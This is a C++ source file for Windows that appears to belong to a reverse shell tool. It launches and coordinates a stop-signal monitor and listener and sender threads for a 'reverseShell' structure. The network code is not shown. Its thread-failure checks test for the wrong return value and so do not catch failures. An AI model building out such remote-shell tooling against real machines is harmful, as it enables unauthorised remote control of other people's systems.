//#include <reverseShell.h>
#include <iostream>

extern reverseShell_t	shell;
extern BOOL				g_stopProcess;
extern volatile LONG	g_stopRoutines;

void notifyStopSignal(void) {
	InterlockedExchange(&g_stopRoutines, TRUE);
}

static BOOL routineShouldStop(void) {
	return (g_stopRoutines != 0);
}

BOOL processShouldStop(void) {
	if (shell.stopEventsignal != INVALID_HANDLE_VALUE) {
		if (WaitForSingleObject(shell.stopEventsignal, 0) == WAIT_OBJECT_0) {
			journalReport(L"Stop event signal reveived\n");
			return (TRUE);
		}
	}
	return (FALSE);
}

DWORD WINAPI threadsHandler(LPVOID) {
	while (true) {
		Sleep(1000);
		if (routineShouldStop() == TRUE) {
			journalReport(L"routine should stop received\n");
			std::cerr	<< "Routine should stop received\n";
			//cleanUp(L"Thread handler routine\n");
			break ;
		}
		//if (processShouldStop() == TRUE) {
		//	journalReport(L"process should stop received\n");
		//	std::cerr	<< "process should stop received\n";
		//	g_stopProcess = TRUE;
		//	//cleanUp(L"Thread handled process\n");
		//	break ;
		//}
	}
	return (SUCCESS);
}

static void createThread(LPTHREAD_START_ROUTINE routineFuncAddr, PHANDLE threadHandle) {
	*threadHandle = CreateThread(
		NULL, 0,
		routineFuncAddr,
		NULL, 0, NULL
	);
}

BYTE launchThreadsMonitor(void) {
	createThread(threadsHandler, &shell.threadsHandler);
	if (shell.threadsHandler == INVALID_HANDLE_VALUE)
		return (FAILURE);
	return (SUCCESS);
}

BYTE startRoutines(void) {
	std::cerr	<< "Starting routines\n";
	createThread(threadsHandler, &shell.threadsHandler);
	if (shell.threadsHandler == INVALID_HANDLE_VALUE) {
		std::cerr	<< "Failed to start thread handler\n";
		return (FAILURE);
	}

	createThread(listener, &shell.threadListener);
	if (shell.threadListener == INVALID_HANDLE_VALUE) {
		std::cerr	<< "Failed to start thread listen\n";
		return (FAILURE);
	}

	createThread(sender, &shell.threadSender);
	if (shell.threadSender == INVALID_HANDLE_VALUE) {
		std::cerr	<< "Failed to start thread send\n";
		return (FAILURE);
	}
	std::cerr	<< "Routines started\n";
	journalReport(L"Routines launched");
	HANDLE threads[] = { shell.threadsHandler, shell.threadListener, shell.threadSender };
	if (WaitForMultipleObjects(3, threads, TRUE, INFINITE) == WAIT_OBJECT_0) {
		g_stopRoutines = 0;
		journalReport(L"Threads done");
	}
	return (SUCCESS);
}